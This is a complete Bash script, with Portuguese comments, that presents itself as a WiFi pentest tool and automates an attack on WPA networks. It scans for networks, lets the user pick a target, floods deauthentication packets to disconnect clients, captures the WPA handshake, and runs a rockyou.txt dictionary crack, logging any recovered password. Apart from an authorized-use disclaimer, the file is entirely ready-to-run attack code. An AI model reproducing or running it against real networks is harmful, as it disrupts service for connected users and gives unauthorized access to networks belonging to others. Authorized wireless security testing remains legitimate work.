#!/bin/bash

################################################################################
# Script de Pentest WiFi Profissional
# Autor: Security Research
# Versão: 1.0
# Descrição: Script automatizado para testes de penetração em redes WiFi
# AVISO: Este script é apenas para fins educacionais e testes autorizados
################################################################################

# Cores para interface
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # Sem cor

# Variáveis globais
INTERFACE=""
TARGET_BSSID=""
TARGET_CHANNEL=""
TARGET_ESSID=""
HANDSHAKE_FILE=""
LOG_DIR="$HOME/wifi_pentest_logs"
LOG_FILE="$LOG_DIR/pentest_$(date +%Y%m%d_%H%M%S).log"
TEMP_DIR="/tmp/wifi_pentest_$$"

################################################################################
# Função: Banner
# Descrição: Exibe o banner do script
################################################################################
banner() {
    clear
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║         SCRIPT DE PENTEST WiFi PROFISSIONAL             ║"
    echo "║                  Versão 1.0 - 2025                       ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${YELLOW}[!] AVISO: Use apenas em redes autorizadas${NC}\n"
}

################################################################################
# Função: Log
# Descrição: Registra mensagens no arquivo de log
# Parâmetros: $1 - Mensagem a ser registrada
################################################################################
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

################################################################################
# Função: Verificar Root
# Descrição: Verifica se o script está sendo executado como root
################################################################################
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[✗] Este script precisa ser executado como root${NC}"
        echo -e "${YELLOW}[!] Use: sudo $0${NC}"
        exit 1
    fi
}

################################################################################
# Função: Verificar Dependências
# Descrição: Verifica se as ferramentas necessárias estão instaladas
################################################################################
check_dependencies() {
    echo -e "${BLUE}[*] Verificando dependências...${NC}"

    local deps=("airmon-ng" "airodump-ng" "aireplay-ng" "aircrack-ng")
    local missing=()

    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done

    if [ ${#missing[@]} -ne 0 ]; then
        echo -e "${RED}[✗] Ferramentas faltando: ${missing[*]}${NC}"
        echo -e "${YELLOW}[!] Instale com: apt-get install aircrack-ng${NC}"
        exit 1
    fi

    echo -e "${GREEN}[✓] Todas as dependências foram encontradas${NC}"
    log_message "Verificação de dependências concluída"
}

################################################################################
# Função: Criar Estrutura de Diretórios
# Descrição: Cria os diretórios necessários para logs e arquivos temporários
################################################################################
setup_directories() {
    mkdir -p "$LOG_DIR" "$TEMP_DIR" 2>/dev/null
    log_message "Diretórios criados: $LOG_DIR, $TEMP_DIR"
}

################################################################################
# Função: Cleanup
# Descrição: Função de limpeza executada ao sair do script
################################################################################
cleanup() {
    echo -e "\n${YELLOW}[!] Executando cleanup...${NC}"

    # Parar processos do airodump e aireplay
    killall airodump-ng aireplay-ng 2>/dev/null

    # Desativar modo monitor
    if [ -n "$INTERFACE" ]; then
        airmon-ng stop "$INTERFACE" &>/dev/null
        log_message "Modo monitor desativado na interface $INTERFACE"
    fi

    # Limpar arquivos temporários
    rm -rf "$TEMP_DIR" 2>/dev/null

    echo -e "${GREEN}[✓] Cleanup concluído${NC}"
    log_message "Script finalizado - Cleanup executado"
    exit 0
}

# Configurar trap para cleanup automático
trap cleanup SIGINT SIGTERM EXIT

################################################################################
# Função: Listar Interfaces
# Descrição: Lista interfaces de rede disponíveis e permite seleção
################################################################################
select_interface() {
    echo -e "${BLUE}[*] Detectando interfaces de rede...${NC}\n"

    # Listar interfaces wireless
    local interfaces=($(iw dev | grep Interface | awk '{print $2}'))

    if [ ${#interfaces[@]} -eq 0 ]; then
        echo -e "${RED}[✗] Nenhuma interface wireless encontrada${NC}"
        exit 1
    fi

    echo -e "${CYAN}Interfaces disponíveis:${NC}"
    for i in "${!interfaces[@]}"; do
        echo -e "${GREEN}[$((i+1))]${NC} ${interfaces[$i]}"
    done

    echo ""
    read -p "Selecione a interface (número): " choice

    if [[ $choice -ge 1 && $choice -le ${#interfaces[@]} ]]; then
        INTERFACE="${interfaces[$((choice-1))]}"
        echo -e "${GREEN}[✓] Interface selecionada: $INTERFACE${NC}"
        log_message "Interface selecionada: $INTERFACE"
    else
        echo -e "${RED}[✗] Seleção inválida${NC}"
        exit 1
    fi
}

################################################################################
# Função: Ativar Modo Monitor
# Descrição: Coloca a interface em modo monitor
################################################################################
enable_monitor_mode() {
    echo -e "${BLUE}[*] Ativando modo monitor em $INTERFACE...${NC}"

    # Matar processos que possam interferir
    airmon-ng check kill &>/dev/null

    # Ativar modo monitor
    airmon-ng start "$INTERFACE" &>/dev/null

    # Atualizar nome da interface (pode mudar para wlan0mon, etc)
    INTERFACE=$(iw dev | grep Interface | grep mon | awk '{print $2}' | head -n1)

    if [ -z "$INTERFACE" ]; then
        echo -e "${RED}[✗] Falha ao ativar modo monitor${NC}"
        exit 1
    fi

    echo -e "${GREEN}[✓] Modo monitor ativado: $INTERFACE${NC}"
    log_message "Modo monitor ativado: $INTERFACE"
}

################################################################################
# Função: Escanear Redes
# Descrição: Escaneia redes WiFi disponíveis
################################################################################
scan_networks() {
    echo -e "${BLUE}[*] Escaneando redes WiFi disponíveis...${NC}"
    echo -e "${YELLOW}[!] Aguarde 15 segundos para escanear...${NC}\n"

    local scan_file="$TEMP_DIR/scan"

    # Iniciar airodump-ng em background
    timeout 15 airodump-ng "$INTERFACE" -w "$scan_file" --output-format csv &>/dev/null

    # Processar resultados
    if [ ! -f "${scan_file}-01.csv" ]; then
        echo -e "${RED}[✗] Falha ao escanear redes${NC}"
        exit 1
    fi

    echo -e "${GREEN}[✓] Escaneamento concluído${NC}\n"
    log_message "Escaneamento de redes concluído"
}

################################################################################
# Função: Selecionar Target
# Descrição: Exibe redes encontradas e permite seleção do alvo
################################################################################
select_target() {
    local scan_file="$TEMP_DIR/scan-01.csv"

    # Extrair e formatar lista de redes (ignorar linhas vazias e station data)
    local networks=$(awk -F',' '/Station/{exit} NF>10 && $1!="BSSID" && $14!="" {gsub(/^[ \t]+|[ \t]+$/, "", $14); print $1","$4","$6","$14}' "$scan_file")

    if [ -z "$networks" ]; then
        echo -e "${RED}[✗] Nenhuma rede encontrada${NC}"
        exit 1
    fi

    echo -e "${CYAN}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║               REDES WiFi DISPONÍVEIS                           ║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════════╝${NC}\n"

    local count=1
    declare -A network_map

    while IFS=',' read -r bssid channel power essid; do
        printf "${GREEN}[%2d]${NC} ${YELLOW}%-32s${NC} ${BLUE}CH:%-3s${NC} ${PURPLE}PWR:%-4s${NC} ${CYAN}%s${NC}\n" \
               "$count" "$bssid" "$channel" "$power" "$essid"
        network_map[$count]="$bssid,$channel,$essid"
        ((count++))
    done <<< "$networks"

    echo ""
    read -p "Selecione o alvo (número): " target_choice

    if [ -n "${network_map[$target_choice]}" ]; then
        IFS=',' read -r TARGET_BSSID TARGET_CHANNEL TARGET_ESSID <<< "${network_map[$target_choice]}"
        echo -e "${GREEN}[✓] Alvo selecionado:${NC}"
        echo -e "    ${CYAN}ESSID:${NC} $TARGET_ESSID"
        echo -e "    ${CYAN}BSSID:${NC} $TARGET_BSSID"
        echo -e "    ${CYAN}Canal:${NC} $TARGET_CHANNEL"
        log_message "Target selecionado: $TARGET_ESSID ($TARGET_BSSID) - Canal $TARGET_CHANNEL"
    else
        echo -e "${RED}[✗] Seleção inválida${NC}"
        exit 1
    fi
}

################################################################################
# Função: Capturar Handshake
# Descrição: Captura handshake WPA com deauth automático
################################################################################
capture_handshake() {
    echo -e "\n${BLUE}[*] Iniciando captura de handshake...${NC}"

    HANDSHAKE_FILE="$LOG_DIR/handshake_${TARGET_ESSID// /_}_$(date +%Y%m%d_%H%M%S)"

    # Iniciar airodump-ng focado no alvo
    airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$HANDSHAKE_FILE" "$INTERFACE" &>/dev/null &
    local airodump_pid=$!

    sleep 3

    echo -e "${YELLOW}[!] Enviando pacotes de deauth...${NC}"

    # Barra de progresso para deauth
    for i in {1..10}; do
        aireplay-ng --deauth 10 -a "$TARGET_BSSID" "$INTERFACE" &>/dev/null &
        echo -ne "${BLUE}[*] Deauth progress: ["
        printf "%0.s#" $(seq 1 $i)
        printf "%0.s-" $(seq $i 9)
        echo -ne "] $((i*10))%\r${NC}"
        sleep 2
    done
    echo ""

    # Aguardar captura
    echo -e "${BLUE}[*] Aguardando captura de handshake (30s)...${NC}"
    sleep 30

    # Parar airodump
    kill $airodump_pid 2>/dev/null

    # Verificar se handshake foi capturado
    if aircrack-ng "${HANDSHAKE_FILE}-01.cap" 2>/dev/null | grep -q "1 handshake"; then
        echo -e "${GREEN}[✓] Handshake capturado com sucesso!${NC}"
        log_message "Handshake capturado: ${HANDSHAKE_FILE}-01.cap"
        return 0
    else
        echo -e "${RED}[✗] Falha ao capturar handshake${NC}"
        echo -e "${YELLOW}[!] Tente novamente ou espere por um cliente conectar${NC}"
        log_message "Falha na captura de handshake"
        return 1
    fi
}

################################################################################
# Função: Ataque de Dicionário
# Descrição: Executa ataque de dicionário com aircrack-ng
################################################################################
dictionary_attack() {
    echo -e "\n${BLUE}[*] Iniciando ataque de dicionário...${NC}"

    # Solicitar arquivo de wordlist
    read -p "Digite o caminho da wordlist [/usr/share/wordlists/rockyou.txt]: " wordlist
    wordlist=${wordlist:-/usr/share/wordlists/rockyou.txt}

    if [ ! -f "$wordlist" ]; then
        echo -e "${RED}[✗] Wordlist não encontrada: $wordlist${NC}"

        # Verificar se rockyou.txt.gz existe
        if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
            echo -e "${YELLOW}[!] Descompactando rockyou.txt...${NC}"
            gunzip /usr/share/wordlists/rockyou.txt.gz
            wordlist="/usr/share/wordlists/rockyou.txt"
        else
            return 1
        fi
    fi

    echo -e "${BLUE}[*] Usando wordlist: $wordlist${NC}"
    echo -e "${YELLOW}[!] Iniciando cracking... Isso pode demorar.${NC}\n"

    log_message "Iniciando ataque de dicionário com $wordlist"

    # Executar aircrack-ng
    aircrack-ng -w "$wordlist" -b "$TARGET_BSSID" "${HANDSHAKE_FILE}-01.cap" | tee -a "$LOG_FILE"

    # Verificar resultado
    if grep -q "KEY FOUND" "$LOG_FILE"; then
        local password=$(grep "KEY FOUND" "$LOG_FILE" | tail -1 | awk -F'[ []' '{print $(NF-1)}')
        echo -e "\n${GREEN}╔════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║          SENHA ENCONTRADA!                 ║${NC}"
        echo -e "${GREEN}╚════════════════════════════════════════════╝${NC}"
        echo -e "${CYAN}ESSID:${NC} $TARGET_ESSID"
        echo -e "${CYAN}Senha:${NC} ${GREEN}$password${NC}\n"
        log_message "SENHA ENCONTRADA para $TARGET_ESSID: $password"
    else
        echo -e "${RED}[✗] Senha não encontrada na wordlist${NC}"
        log_message "Senha não encontrada - wordlist esgotada"
    fi
}

################################################################################
# Função: Menu Principal
# Descrição: Exibe menu interativo principal
################################################################################
main_menu() {
    banner
    check_root
    check_dependencies
    setup_directories

    echo -e "${BLUE}[*] Log do pentest: $LOG_FILE${NC}\n"
    log_message "=== NOVA SESSÃO DE PENTEST INICIADA ==="

    select_interface
    enable_monitor_mode
    scan_networks
    select_target

    if capture_handshake; then
        read -p "Deseja executar ataque de dicionário? [s/N]: " attack_choice
        if [[ $attack_choice =~ ^[Ss]$ ]]; then
            dictionary_attack
        else
            echo -e "${YELLOW}[!] Handshake salvo em: ${HANDSHAKE_FILE}-01.cap${NC}"
            echo -e "${YELLOW}[!] Execute manualmente: aircrack-ng -w wordlist.txt ${HANDSHAKE_FILE}-01.cap${NC}"
        fi
    fi

    echo -e "\n${GREEN}[✓] Pentest concluído${NC}"
    echo -e "${BLUE}[*] Logs salvos em: $LOG_FILE${NC}"
}

################################################################################
# INÍCIO DO SCRIPT
################################################################################
main_menu
